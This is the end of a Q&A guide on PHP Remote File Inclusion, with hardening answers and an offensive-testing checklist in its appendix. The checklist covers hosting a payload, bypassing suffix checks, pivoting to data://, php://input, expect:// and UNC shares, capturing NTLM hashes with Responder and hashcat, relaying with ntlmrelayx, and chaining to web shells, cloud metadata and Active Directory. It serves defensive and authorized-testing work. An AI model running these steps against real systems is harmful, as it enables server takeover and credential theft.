**Never pass user input to `include`/`require`.** Use a fixed **allowlist mapping** (an id → a known **local** file chosen server-side). If a path must be built, canonicalize and verify it resolves to an expected local file — never a URL, wrapper, or UNC path.

### Q97. Per-risk hardening?
- Set **`allow_url_include=Off`** **and** `allow_url_fopen=Off` where possible.
- **Disable/restrict** the wrappers: `data://`, `php://input`, `expect`, `phar`.
- **Block outbound** HTTP/FTP/**SMB** egress from the web tier (kills remote includes, `data://` exfil, and NTLM coercion); for Windows, block outbound 445 **and** 80/443 WebDAV where feasible.
- **Reject remote schemes and UNC paths** after canonicalization.
- Run the web user **least-privilege**; patch the stack/CMS/plugins; rotate any secret an RCE could read.

### Q98. How do I prevent the Windows UNC / NTLM angle?
Block outbound **SMB/445** and **WebDAV (80/443)** from the web tier; disable the WebClient (WebDAV) service on the host; reject UNC/`\\`-style paths in the include logic; and ensure includes resolve only to a fixed local directory. NTLM relay defenses (SMB signing, EPA, channel binding) limit the relay impact if coercion still occurs.

### Q99. How do I tell RFI and SSRF apart for defense?
If the feature is *supposed* to **fetch** a URL (webhook/import), harden it as **SSRF** (allowlist destinations, block internal/metadata, no redirects). If a feature **includes/executes** a file, it should **never** accept a remote/wrapper/UNC location — that's the RFI control. Different sinks, different (overlapping) defenses.

### Q100. One-paragraph summary you can quote.
*"RFI happens when an application includes and executes a file whose location an attacker controls — so never pass user input to `include`/`require`: map an id to a fixed local file from a server-side allowlist, and reject any remote scheme, wrapper (`data://`/`php://input`/`expect`/`phar`), or UNC path. Turn off `allow_url_include` and `allow_url_fopen`, block outbound HTTP/FTP/SMB/WebDAV egress from the web tier (which also stops the Windows UNC trick that coerces NTLM authentication and leaks the machine hash), and run least-privilege. Remember that a feature meant to fetch a URL is an SSRF surface, while one that includes a file must never accept a remote location at all — a single `?page=http://…` (or `\\attacker\share`) can otherwise execute the attacker's code and hand over the server, the cloud, and, on Windows, the domain."*

---

## APPENDIX — 60-second RFI field checklist
```
[ ] Find include sinks selectable by URL ; test confirmed LFI INCLUDE sinks as RFI candidates
[ ] Stand up a payload host serving PHP as TEXT + logging hits ; OOB listener for blind
[ ] BASELINE: point include at my host with <?php echo 7*7*7; ?> → "343" = EXECUTION = RFI (a fetch-only = SSRF)
[ ] Make it land: host .txt as text/plain ; defeat .php suffix with ? (or %23/%00) ; scheme/encoding ; allowlist (redirect/@/contains)
[ ] http:// blocked? → data:// / php://input / expect:// (no fetch) ; Windows → UNC \\me\share\shell.php
[ ] Windows extras: NTLM capture (Responder, hashcat -m 5600) / relay (ntlmrelayx) — even WITHOUT execution ; WebDAV \\me@80\ if 445 blocked
[ ] Impact: benign marker (343) → single system('id') ; blind → callback-with-cmd-output / sleep ; clean up
[ ] CHAIN: RFI → web shell → cloud metadata/internal ; UNC → NTLM relay → AD ; open-redirect → past allowlist
[ ] VALIDITY: only claim RFI when CODE RAN ; a fetch-only is SSRF ; CWE-98(+94) ; one finding per sink ; report RCE
```
*End of guide.*
